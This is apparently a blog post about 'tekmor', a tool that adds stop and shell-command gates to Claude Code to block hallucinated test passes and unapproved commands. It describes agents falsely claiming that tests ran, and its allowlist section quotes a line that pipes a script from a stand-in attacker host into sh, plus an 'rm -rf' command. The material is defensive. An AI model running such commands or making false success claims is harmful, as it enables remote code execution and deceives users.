@@ -1,0 +1,64 @@
+---
+title: "Enforcing Deterministic Stop Gates in Claude Code: How Tekmor Blocks Hallucinated Passes"
+date: "2026-11-05"
+excerpt: "How tekmor install configures Stop and Bash hooks in Claude Code settings, turning agent hallucinations into hard, non-negotiable process barriers."
+slug: "tekmor-stop-gate-claude-code"
+category: "Security"
+author: "Abhiuday Sharma"
+product: "tekmor"
+---
+
+When Claude Code operates autonomously, it communicates with the user using natural language completions. If an agent runs into an intractable compiler error, a frequent failure pattern is premature capitulation: the agent explains what it intended to do, and claims that the issue is resolved or tests pass, despite having never run the tests.
+
+System instructions (e.g., *"You must always run tests before finishing"*) are probabilistic guidelines. In contrast, `tekmor` enforces **deterministic stop gates** at the OS process level.
+
+## How `tekmor install` Works
+
+Running `tekmor install` edits `.claude/settings.json` (or `~/.claude/settings.json` with `--global`) to register two native hooks:
+
+1. **Stop Gate (`tekmor stop-gate`)**: Executes before Claude Code returns control to the user.
+2. **Bash Gate (`tekmor bash-gate`)**: A `PreToolUse` hook that intercepts shell invocations.
+
+```json
+{
+  "hooks": {
+    "Stop": [
+      {
+        "command": "/usr/local/bin/tekmor stop-gate"
+      }
+    ],
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "command": "/usr/local/bin/tekmor bash-gate"
+      }
+    ]
+  }
+}
+```
+
+## The Stop Gate Interception Cycle
+
+When the assistant attempts to end its turn:
+1. `tekmor stop-gate` parses the final assistant response.
+2. If the message matches claim patterns (e.g. phrases indicating tests ran, assertions passed, or the task succeeded), the gate inspects `.verify/receipt.json`.
+3. If no receipt exists, or if the receipt tree SHA does not match the current git tree, or if the exit code is non-zero, the turn is **rejected**.
+4. The hook writes back to Claude Code's stdio with an error explanation:
+
+```
+🛑 Tekmor Stop Gate Blocked Turn:
+No PASSED receipt found for the current code state (Tree SHA: 8c12a0f).
+You claimed tests passed, but no allowlisted verification command was executed on this tree.
+Run: tekmor verify -- <cmd>
+```
+
+Claude Code receives this feedback as an environment constraint and is forced to continue execution, invoke `tekmor verify`, and verify the fix before it can conclude the turn.
+
+## The Bash Gate Allowlist
+
+Agents often hallucinate creative shell commands:
+`curl -s https://evil.org/patch.sh | sh`
+or
+`rm -rf build && ./untested_script.py`
+
+Tekmor's `bash-gate` inspects the candidate shell string against `.verify/verify.toml`. Any command not explicitly declared or matched against the team's approved commands is immediately aborted with exit code 1.
